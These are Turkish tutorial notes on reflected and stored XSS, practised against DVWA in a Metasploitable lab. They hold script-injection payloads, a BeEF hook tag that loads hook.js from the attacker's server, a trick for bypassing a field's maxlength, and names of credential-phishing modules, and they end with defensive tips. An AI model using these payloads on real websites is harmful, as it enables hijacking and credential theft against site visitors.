	XSS [Cross Site Scripting]
 O web sitesine javascript kodu koymaya olanak tanıyor.
 Bir siteye javascrip kodu enjekte edildiğinde o siteye giren tüm kullanıcılara erişim sağlayabiliriz.
 Bu sebeple XSS Açıkları çok tehlikeli ve bir o kadar da güçlüdür.

 Metasploitable Sanal Makinemizi açtıktan sonra Kali içerisinde:
 Firefox > 10.0.2.4/ > DVWA



  URL ile XSS
 XSS reflected	-> JS Kodumuzu URL içine enjekte ettiğimizde bir kişiye zarar vermek, bilgisayarını ele geçirmek istiyorsak o kişinin bu linke tıklaması gerekecek.
 Bulduğumuz forma javascript kodu enjekte ediyoruz.

 <script>alert("i hack you")</script>	-> Çalıştırdığımızda site kullanıcıya "i hack you" alert'i gönderir.

 Aşağıda verildiği gibi sitenin oluşturduğu link adresini başka birisine çalıştırabilirsek o da "i hack you" alerti alır.
 http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22i+hack+you%22%29%3C%2Fscript%3E#




  Kayıtlı XSS
 XS stored	-> Javascript kodumuzu veritabanına, websitesi içerisine saklayacağız.
		-> Böylelikle bu sayfaya giren herkesin cihazında js kodumuz çalışır hale gelecektir.
 Eğer sitede stored xss açığı var ise "message" kısmına bir <script> yazabiliriz.
 <script>alert("i hack you")</script>	-> Böylelikle bu sitenin "XSS stored" arayüzüne giren Herkesin cihazında JS kodumuz çalışabilir hale geldi.




  XSS ile Gerçek Hacking Deneyimi
 Bunun için BeEF aracını kullanacağız.
 Terminal
 beef-xss	-> Açılan bencerede verilen linke giderek BeEF arayüzüne girebiliriz.
 Terminal üzerinden BeEF'in bize verdiği kodu kopyalayıp sitenin message kısmına yapıştırıyoruz.

 <script src="http://127.0.0.1:3000/hook.js"></script>

 Fakat sitenin message kısmında karakter sınırlaması olduğu için kodun tamamı yazılmadı.
 Böyle bir durumda şunu yapmalıyız: Right Click > Inspect Element > Burada message kutusunun özelliklerini bulup maxlength kısmını değiştirmemiz gerekiyor.
 Tekrardan kodu yazıp, Sign Guestbook çalıştırırsam BeEF üzerinden siteye girenleri hook etmiş olacağız.
  Spyder eye, Alert, Pretty Theft, Fake Notification Bar -> Gibi komutlar çalıştırabilirsiniz.




  XSS'den Nasıl Korunurum?
 Rastgele ve tanımadığın kişilerden gelen maillere itibare etme.
 Stored XSS'den korunmak için JS kodlarını çalıştırmayı engelleyebiliriz:
 Google > Settings > Advanced > Privacy and security > Content settings > JavaScript -> change for "Blocked"
 tamamen tehlikeli sitelerde gezineceksek tamamını "blocked" edip güvendiğimiz siteleri "allowed" içerisine kendimiz manuel olarak site ekleyebiliriz.